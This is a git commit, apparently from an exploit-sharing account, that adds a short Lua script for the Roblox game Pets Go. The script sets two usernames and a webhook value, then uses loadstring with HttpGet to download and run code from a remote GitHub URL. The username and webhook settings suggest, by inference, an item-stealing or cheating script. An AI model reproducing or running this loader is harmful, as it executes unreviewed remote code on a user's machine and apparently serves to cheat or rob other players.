e07dfd7dfc491cae47084922bd71c356a9434e13
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 09:46:25 +0200

    Add generated script

---
+++ pets go/auraisop.lua
@@ -0,0 +1,5 @@
+Username = "dggg"
+Username2 = "jhgfsdas"
+Webhook = "url.xdddd"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
